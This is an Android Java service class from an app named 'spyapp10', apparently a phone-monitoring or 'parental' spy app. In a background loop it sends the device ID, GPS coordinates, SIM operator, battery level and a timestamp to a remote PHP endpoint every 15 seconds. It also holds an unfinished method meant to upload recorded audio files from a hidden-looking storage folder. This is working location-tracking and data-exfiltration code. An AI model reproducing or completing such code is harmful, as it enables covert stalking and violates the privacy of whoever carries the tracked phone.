package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

public class MyService2 extends Service implements LocationListener {

    public static String battery = "---";
    public static String lat = "---", lng = "---";
    String email = "";
    String DeviceId;
    String latlng = " | ";

    public MyService2() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            this.registerReceiver(this.mBatInfoReceiver, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            latlng = intent.getStringExtra("myValue");
            email = MainActivity.EMAIL;
            int i = 0;
            int j = 0;
            for (i = 0; i < latlng.length() - 1; i++) {
                if (latlng.substring(i, i + 1).equals("|")) {
                    lat = latlng.substring(0, i);
                    lng = latlng.substring(i + 1, latlng.length() - 1);
                }
            }
            DeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);

            final Thread runnable = new Thread() {
                @Override
                public void run() {
                    while (true) {
                        try {
                            TelephonyManager t = (TelephonyManager) getApplicationContext().getSystemService(getApplicationContext().TELEPHONY_SERVICE);
                            String operatorName = t.getSimOperatorName();
                            new UpdateUserDetailLOC().execute(email, DeviceId, lat, lng, getDateTime(), operatorName, battery);
                            sleep(15000);
                        } catch (Exception e) {
                            Log.e("errorinService2", e.toString());
                        }
                    }
                }
            };
            runnable.start();
        } catch (Exception e) {
            Log.e("errorinService2", e.toString());
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
    }

    public String getDateTime() {
        Calendar c = Calendar.getInstance();
        SimpleDateFormat df = new SimpleDateFormat("dd-MMM-yyyy");
        String day = df.format(c.getTime());
        SimpleDateFormat tf = new SimpleDateFormat("HH:mm");
        return "DATE- " + day + "  TIME- " + tf.format(c.getTime());
    }

    @Override
    public void onLocationChanged(Location location) {
        lat = String.valueOf(location.getLatitude());
        lng = String.valueOf(location.getLongitude());
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }

    @Override
    public void onProviderEnabled(String provider) {
    }

    @Override
    public void onProviderDisabled(String provider) {
    }

    private class UpdateUserDetailLOC extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {

            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/locup.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(7);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("lat", params[2]));
                nameValuePair.add(new BasicNameValuePair("longi", params[3]));
                nameValuePair.add(new BasicNameValuePair("time", params[4]));
                nameValuePair.add(new BasicNameValuePair("operator", params[5]));
                nameValuePair.add(new BasicNameValuePair("battery", params[6]));

                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }

    BroadcastReceiver mBatInfoReceiver = new BroadcastReceiver() {


        @Override
        public void onReceive(Context ctxt, Intent intent) {
            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
            battery = level + "%";
            changeBattery(battery);
        }
    };

    public void changeBattery(String x) {
        new UpdateUserDetailBattery().execute(email, Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID), x);
    }

    private class UpdateUserDetailBattery extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/battery.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(3);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("battery", params[2]));
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }

    public void sendAudioIfExist() {
        DataOutputStream dos = null;
        DataInputStream inStream = null;
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        File sdCard = Environment.getExternalStorageDirectory();
        File dir = new File(sdCard, "XPCR");
        for (File f : dir.listFiles()) {
            if (f.isFile()) {
                //encode and transfer here
            }
        }
    }
}